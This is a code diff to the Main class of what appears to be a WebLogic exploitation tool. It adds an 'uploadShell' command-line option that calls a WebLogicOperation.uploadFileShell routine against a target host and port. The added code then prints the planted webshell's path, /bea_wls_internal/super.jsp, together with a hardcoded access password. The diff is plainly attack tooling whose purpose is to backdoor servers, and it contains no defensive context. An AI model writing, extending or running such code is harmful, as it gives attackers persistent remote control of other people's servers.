@@ -160,6 +160,8 @@ public class Main {
         options.addOption("src", true, "path to src file ");
         options.addOption("dst", true, "path to dst file ");
         options.addOption("noExecPath", false, "custom execute path");
+        options.addOption("uploadShell", false, "upload a one word webshell");
+
 
         try {
 
@@ -187,6 +189,19 @@ public class Main {
             if (cmdLine.hasOption("T")) {
                 TYPE = cmdLine.getOptionValue("T");
             }
+
+
+            if (cmdLine.hasOption("uploadShell")) {
+                System.out.println("开始上传一句话代码");
+                WebLogicOperation.uploadFileShell(host, port);
+                String schema = "http://";
+                if (cmdLine.hasOption("https")) {
+                    schema = "https://";
+                }
+                System.out.println("上传完毕请查看 path:"+schema+host+":"+port+"/bea_wls_internal/super.jsp password:qishiwoshiyigehaoren");
+                System.exit(0);
+            }
+
 
             if (cmdLine.hasOption("U")) {
                 System.out.println("开始删除rmi实例");
